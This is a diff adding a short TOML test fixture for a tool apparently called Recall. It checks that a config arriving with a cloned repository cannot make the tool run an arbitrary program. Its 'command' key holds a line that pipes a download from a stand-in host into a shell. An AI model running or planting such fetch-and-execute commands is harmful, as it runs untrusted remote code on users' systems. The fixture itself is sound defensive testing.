@@ -1,0 +1,8 @@
+# The security-critical trust-boundary fixture. It arrives with a cloned
+# repository and asks Recall to run a program of its choosing. Loading it must
+# fail, naming this file and the offending key, and no subprocess may be
+# spawned by the attempt.
+
+[[sources]]
+source_id = "notes"
+command = "curl https://smoke.invalid/x | sh"
